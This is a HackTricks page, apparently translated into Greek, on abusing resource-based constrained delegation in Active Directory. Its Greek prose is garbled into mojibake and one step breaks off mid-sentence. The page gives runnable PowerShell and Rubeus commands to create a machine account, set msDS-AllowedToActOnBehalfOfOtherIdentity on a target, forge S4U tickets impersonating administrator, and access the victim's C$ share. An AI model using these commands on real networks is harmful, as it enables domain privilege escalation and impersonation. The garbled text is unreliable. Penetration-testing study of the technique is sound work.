# Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î‘Î½Î¬Î¸ÎµÏƒÎ· Î ÏŒÏÏ‰Î½

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î‘ÏÏ‡Î­Ï‚ Ï„Î·Ï‚ Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î·Ï‚ Î‘Î½Î¬Î¸ÎµÏƒÎ·Ï‚ Î ÏŒÏÏ‰Î½

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î· Î²Î±ÏƒÎ¹ÎºÎ® [Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î‘Î½Î¬Î¸ÎµÏƒÎ·](constrained-delegation.md) Î±Î»Î»Î¬ **Î±Î½Ï„Î¯ Î½Î± Î´Î¯Î½ÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î½Î± Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¹ÏÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î· Î­Î½Î±Î½Ï„Î¹ ÎµÎ½ÏŒÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**. Î— Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î‘Î½Î¬Î¸ÎµÏƒÎ· Î ÏŒÏÏ‰Î½ **Î¿ÏÎ¯Î¶ÎµÎ¹ ÏƒÏ„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Î¹Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¹ÏÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î· Î­Î½Î±Î½Ï„Î¹ Î±Ï…Ï„Î¿Ï**.

Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Ï„Î¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¸Î± Î­Ï‡ÎµÎ¹ Î­Î½Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¹ÏÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ Ï‡ÏÎ®ÏƒÏ„Î· Î­Î½Î±Î½Ï„Î¹ Î±Ï…Ï„Î¿Ï.

ÎœÎ¹Î± Î¬Î»Î»Î· ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ® Î´Î¹Î±Ï†Î¿ÏÎ¬ Î±Ï€ÏŒ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î‘Î½Î¬Î¸ÎµÏƒÎ· ÏƒÎµ ÏƒÏ‡Î­ÏƒÎ· Î¼Îµ Ï„Î¹Ï‚ Î¬Î»Î»ÎµÏ‚ Î±Î½Î±Î¸Î­ÏƒÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Îµ **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÎµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î¼Î·Ï‡Î±Î½Î®Ï‚** (_GenericAll/GenericWrite/WriteDacl/WriteProperty ÎºÎ»Ï€_) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î¿ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Î£Ï„Î¹Ï‚ Î¬Î»Î»ÎµÏ‚ Î¼Î¿ÏÏ†Î­Ï‚ Î‘Î½Î¬Î¸ÎµÏƒÎ·Ï‚ Ï‡ÏÎµÎ¹Î±Î¶ÏŒÏƒÎ±ÏƒÏ„Î±Î½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Ï„Î¿Î¼Î­Î±).

### ÎÎ­ÎµÏ‚ ÎˆÎ½Î½Î¿Î¹ÎµÏ‚

Î£Ï„Î·Î½ Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î‘Î½Î¬Î¸ÎµÏƒÎ· ÎµÎ¯Ï‡Îµ Î±Î½Î±Ï†ÎµÏÎ¸ÎµÎ¯ ÏŒÏ„Î¹ Î· ÏƒÎ·Î¼Î±Î¯Î± **`TrustedToAuthForDelegation`** Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ Ï„Î¹Î¼Î® _userAccountControl_ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î­Î½Î± **S4U2Self**. Î‘Î»Î»Î¬ Î±Ï…Ï„ÏŒ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½Ï„ÎµÎ»ÏÏ‚ Î±Î»Î®Î¸ÎµÎ¹Î±.\
Î— Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï„Î¹Î¼Î®, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î­Î½Î± **S4U2Self** Î­Î½Î±Î½Ï„Î¹ Î¿Ï€Î¿Î¹Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î· Î±Î½ ÎµÎ¯ÏƒÏ„Îµ Î¼Î¹Î± **Ï…Ï€Î·ÏÎµÏƒÎ¯Î±** (Î­Ï‡ÎµÏ„Îµ Î­Î½Î± SPN) Î±Î»Î»Î¬, ÎµÎ¬Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¿ **`TrustedToAuthForDelegation`**, Ï„Î¿ ÎµÏ€Î¹ÏƒÏ„ÏÎµÏ†ÏŒÎ¼ÎµÎ½Î¿ TGS Î¸Î± ÎµÎ¯Î½Î±Î¹ **Î”Ï…Î½Î±Ï„ÏŒ Î½Î± Î ÏÎ¿Ï‰Î¸Î·Î¸ÎµÎ¯** ÎºÎ±Î¹ ÎµÎ¬Î½ **Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ** Î±Ï…Ï„Î®Î½ Ï„Î· ÏƒÎ·Î¼Î±Î¯Î± Ï„Î¿ ÎµÏ€Î¹ÏƒÏ„ÏÎµÏ†ÏŒÎ¼ÎµÎ½Î¿ TGS **Î´ÎµÎ½** Î¸Î± ÎµÎ¯Î½Î±Î¹ **Î”Ï…Î½Î±Ï„ÏŒ Î½Î± Î ÏÎ¿Ï‰Î¸Î·Î¸ÎµÎ¯**.

Î©ÏƒÏ„ÏŒÏƒÎ¿, ÎµÎ¬Î½ Ï„Î¿ **TGS** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿ **S4U2Proxy** **Î”Î•Î ÎµÎ¯Î½Î±Î¹ Î”Ï…Î½Î±Ï„ÏŒ Î½Î± Î ÏÎ¿Ï‰Î¸Î·Î¸ÎµÎ¯** ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î¼Î¹Î± **Î²Î±ÏƒÎ¹ÎºÎ® Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î‘Î½Î¬Î¸ÎµÏƒÎ·**, **Î´ÎµÎ½ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹**. Î‘Î»Î»Î¬ ÎµÎ¬Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î¼Î¹Î± **Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î‘Î½Î¬Î¸ÎµÏƒÎ· Î ÏŒÏÏ‰Î½**, Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ (Î±Ï…Ï„ÏŒ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±, ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±, Ï†Î±Î¯Î½ÎµÏ„Î±Î¹).

### Î”Î¿Î¼Î® Î•Ï€Î¯Î¸ÎµÏƒÎ·Ï‚

> Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ **Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚** ÏƒÎµ Î­Î½Î±Î½ **Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î¥Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ **Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î· Î¼Î·Ï‡Î±Î½Î®.

Î¥Ï€Î¿Î¸Î­ÏƒÏ„Îµ ÏŒÏ„Î¹ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î­Ï‡ÎµÎ¹ Î®Î´Î· **Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Î¸ÏÎ¼Î±**.

1. ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ **Î´Î¹Î±ÏÏÎ­ÎµÎ¹** Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î­Î½Î± **SPN** Î® **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î±Î½** ("Î¥Ï€Î·ÏÎµÏƒÎ¯Î± Î‘"). Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ** _Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î§ÏÎ®ÏƒÏ„Î·Ï‚_ Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Î½Î­Î½Î± Î¬Î»Î»Î¿ ÎµÎ¹Î´Î¹ÎºÏŒ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î¿ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹** Î­Ï‰Ï‚ ÎºÎ±Î¹ 10 **Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Î¥Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® (**_**MachineAccountQuota**_**)** ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï…Ï‚ Î¿ÏÎ¯ÏƒÎµÎ¹ Î­Î½Î± SPN. ÎˆÏ„ÏƒÎ¹ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î±Ï€Î»Î¬ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¥Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® ÎºÎ±Î¹ Î½Î± Î¿ÏÎ¯ÏƒÎµÎ¹ Î­Î½Î± SPN.
2. ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ **ÎºÎ±Ï„Î±Ï‡ÏÎ¬Ï„Î±Î¹ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î±
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Î•Ï€Î¯Î¸ÎµÏƒÎ·

### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Ï„Î¿Î¼Î­Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Î¡ÏÎ¸Î¼Î¹ÏƒÎ· Î ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î·Ï‚ Î‘Î½Î¬Î¸ÎµÏƒÎ·Ï‚ Î ÏŒÏÏ‰Î½

**Î§ÏÎ®ÏƒÎ· Ï„Î¿Ï… PowerShell module activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ Ï€Î»Î®ÏÎ¿Ï…Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÏ‰Ï‚ S4U

ÎšÎ±Ï„Î±ÏÏ‡Î®Î½, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ±Î¼Îµ Ï„Î¿ Î½Î­Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¥Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Î¼Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ `123456`, Î¿Ï€ÏŒÏ„Îµ Ï‡ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Îµ Ï„Î¿ hash Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Î‘Ï…Ï„ÏŒ Î¸Î± ÎµÎºÏ„Ï…Ï€ÏÏƒÎµÎ¹ Ï„Î¹Ï‚ ÎºÎ±Ï„Î±ÎºÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ RC4 ÎºÎ±Î¹ AES Î³Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ.\
Î¤ÏÏÎ±, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ·:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± ÎµÎ¹ÏƒÎ¹Ï„Î®ÏÎ¹Î± Î±Ï€Î»Î¬ Î¶Î·Ï„ÏÎ½Ï„Î±Ï‚ Î¼Î¯Î± Ï†Î¿ÏÎ¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `/altservice` Ï„Î¿Ï… Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ· ÏŒÏ„Î¹ Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î­Ï‡Î¿Ï…Î½ Î­Î½Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ "**Î”ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Ï„ÎµÎ¸ÎµÎ¯**". Î‘Î½ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î­Ï‡ÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÏƒÎµ True, Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¹ÏÏƒÎµÏ„Îµ Ï„Î·Î½ Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î¬ Ï„Î¿Ï…. Î‘Ï…Ï„Î® Î· Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¼Ï†Î±Î½Î¹ÏƒÏ„ÎµÎ¯ ÏƒÏ„Î¿ bloodhound.
{% endhint %}

### Î ÏÏŒÏƒÎ²Î±ÏƒÎ·

Î— Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Î³ÏÎ±Î¼Î¼Î® ÎµÎ½Ï„Î¿Î»ÏÎ½ Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î·Î½ **Ï€Î»Î®ÏÎ· ÎµÏ€Î¯Î¸ÎµÏƒÎ· S4U ÎºÎ±Î¹ Î¸Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Ï„Î¿ TGS** Î±Ï€ÏŒ Ï„Î¿Î½ Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®-Î¸ÏÎ¼Î± ÏƒÏ„Î·Î½ **Î¼Î½Î®Î¼Î·**.\
Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¶Î·Ï„Î®Î¸Î·ÎºÎµ Î­Î½Î± TGS Î³Î¹Î± Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± **CIFS** Î±Ï€ÏŒ Ï„Î¿Î½ Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®, Î¿Ï€ÏŒÏ„Îµ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ **C$**.
```bash
ls \\victim.domain.local\C$
```
### ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏÎ½ ÎµÎ¹ÏƒÎ¹Ï„Î·ÏÎ¯Ï‰Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚

ÎœÎ¬Î¸ÎµÏ„Îµ Î³Î¹Î± Ï„Î± [**Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î± ÎµÎ¹ÏƒÎ¹Ï„Î®ÏÎ¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ ÎµÎ´Ï**](silver-ticket.md#available-services).

## Î£Ï†Î¬Î»Î¼Î±Ï„Î± Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ Kerberos ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ Î½Î± Î¼Î·Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ DES Î® Ï„Î¿ RC4 ÎºÎ±Î¹ ÎµÏƒÎµÎ¯Ï‚ Ï€Î±ÏÎ­Ï‡ÎµÏ„Îµ Î¼ÏŒÎ½Î¿ Ï„Î¿ RC4 hash. Î Î±ÏÎ­Ï‡ÎµÏ„Îµ ÏƒÏ„Î¿ Rubeus Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ Ï„Î¿ AES256 hash (Î® Î±Ï€Î»Î¬ Ï€Î±ÏÎ­Ï‡ÎµÏ„Îµ Ï„Î± hashes rc4, aes128 ÎºÎ±Î¹ aes256). Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
